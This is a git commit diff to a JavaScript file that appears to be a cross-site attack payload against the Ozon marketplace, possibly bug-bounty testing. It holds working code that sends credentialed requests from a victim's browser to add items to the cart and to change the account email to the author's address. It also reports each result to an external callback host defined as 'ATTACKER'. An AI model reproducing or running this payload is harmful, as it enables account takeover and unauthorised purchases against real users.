6ab468f0376395bfebf42f111559c8912b593c77
GMchik <chupanovgadji@gmail.com>
2026-02-27 12:49:22 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,4 +1,4 @@
-alert('new_4');
+alert('new_5');
 
 var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';
 
@@ -18,12 +18,39 @@ fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
 .catch(function(err) {
     navigator.sendBeacon(ATTACKER + '?cors=blocked&err=' + encodeURIComponent(err.toString()));
 
-    fetch('https://api.ozon.ru/composer-api.bx/_action/v2/addToCart', {
+    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ items: [{ id: 153560750, quantity: 1 }] }),
+        body: JSON.stringify({ items: [{ id: 1215057882, quantity: 1 }] }),
         credentials: 'include',
         mode: 'no-cors'
+    }).then(function() {
+        navigator.sendBeacon(ATTACKER + '?cart=fired');
+    });
+
+    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ items: [{id:1215057882,quantity:2}] }),
+        credentials: 'include',
+    }).then(function() {
+        navigator.sendBeacon(ATTACKER + '?cart=fired');
+    });
+
+    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
+        method: 'POST',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify({ items: [{id:1215057882,quantity:3}] }),
+        credentials: 'include',
+    }).then(function() {
+        navigator.sendBeacon(ATTACKER + '?cart=fired');
+    });
+
+    fetch('https://www.ozon.ru/api/composer-api.bx/_action/changeEmailV3', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ items: [{referer:"https://www.ozon.ru/ozonid",email:"chupanovgadji@gmail.com"}] }),
+        credentials: 'include',
     }).then(function() {
         navigator.sendBeacon(ATTACKER + '?cart=fired');
     });
